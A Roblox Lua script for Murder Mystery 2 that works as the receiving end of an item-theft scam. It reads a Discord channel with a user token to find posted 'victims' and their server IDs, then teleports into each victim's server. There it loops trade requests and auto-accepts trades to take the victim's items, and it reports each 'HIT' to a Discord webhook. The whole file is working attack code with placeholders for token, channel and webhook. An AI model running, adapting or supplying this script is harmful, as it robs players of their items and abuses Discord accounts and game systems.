if not game:IsLoaded() then
    game.Loaded:Wait()
end

if token == "" or channelId == "" or webhookUrl == "" then
    game.Players.LocalPlayer:Kick("Add your token, channelId, and webhookUrl to use")
end

-- Anti-AFK
local bb = game:GetService("VirtualUser")
game:service("Players").LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- File setup
local victimFile = isfile("user.txt")
local joinedFile = isfile("joined_ids.txt")
local successFile = isfile("success_ids.txt")
if not victimFile then writefile("user.txt", "victim username") end
if not joinedFile then writefile("joined_ids.txt", "[]") end
if not successFile then writefile("success_ids.txt", "[]") end

local victimUser = readfile("user.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local successIds = HttpServ:JSONDecode(readfile("success_ids.txt"))
local didVictimLeave = false
local timer = 0
local hasSentWebhook = false

-- Device selection
local function selectDevice()
    while task.wait(0.1) do
        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
        if DeviceSelectGui then
            local Container = DeviceSelectGui:WaitForChild("Container")
            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
            local buttonPos = button.AbsolutePosition
            local buttonSize = button.AbsoluteSize
            local centerX = buttonPos.X + buttonSize.X / 2
            local centerY = buttonPos.Y + buttonSize.Y / 2
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        end
    end
end
task.spawn(selectDevice)

wait(4)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Hai!')

-- Trade functions
local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

local function saveSuccessId(messageId)
    table.insert(successIds, messageId)
    writefile("success_ids.txt", HttpServ:JSONEncode(successIds))
end

local function sendWebhookNotification(victimName)
    local response = request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpServ:JSONEncode({
            content = "New MM2 HIT!!!!",
            embeds = {{
                title = "Successful Trade",
                description = "Obtained items from "..victimName,
                color = 65280,
                timestamp = DateTime.now():ToIsoDate()
            }}
        })
    })
    return response.StatusCode == 200 or response.StatusCode == 204
end

local function acceptRequest()
    while task.wait(0.1) do
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
        local args = {
            [1] = game:GetService("Players"):WaitForChild(victimUser)
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
    end
end

local function acceptTrade()
    while task.wait(0.1) do
        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
    end
end

local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

local function IsTrading()
    local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
    return trade_status == "StartTrade"
end

local function tradeTimer()
    while task.wait(1) do
        if IsTrading() then
            timer = 0
        else
            timer = timer + 1
        end
    end
end

local function checkWebhookForSuccess(messageId)
    -- Check recent webhook messages to see if success was already posted
    local response = request({
        Url = webhookUrl.."?limit=10",
        Method = "GET",
        Headers = {
            ["Content-Type"] = "application/json"
        }
    })
    
    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        for _, msg in ipairs(messages) do
            if msg.content == "New MM2 HIT!!!!" and 
               msg.embeds and msg.embeds[1] and 
               msg.embeds[1].description:find(victimUser) then
                return true
            end
        end
    end
    return false
end

-- Main execution
waitForPlayerLeave()
task.spawn(acceptTrade)
task.spawn(tradeTimer)
wait(3)
task.spawn(acceptRequest)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then return end
        
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Join to get e") then
                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
                    if placeId and jobId then
                        local victimUsername = message.embeds[1].fields[1].value
                        local messageId = tostring(message.id)

                        -- Only proceed if we haven't already successfully traded from this message
                        if not table.find(successIds, messageId) then
                            if didVictimLeave or timer > 5 then
                                -- Check if webhook notification was already sent
                                local alreadySent = checkWebhookForSuccess(messageId)
                                
                                if not alreadySent then
                                    -- Try to send webhook notification
                                    hasSentWebhook = sendWebhookNotification(victimUser)
                                    
                                    if hasSentWebhook then
                                        saveSuccessId(messageId)
                                    end
                                end
                                
                                if not table.find(joinedIds, messageId) then
                                    saveJoinedId(messageId)
                                    writefile("user.txt", victimUsername)
                                    game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                    return
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

while wait(5) do
    autoJoin()
end
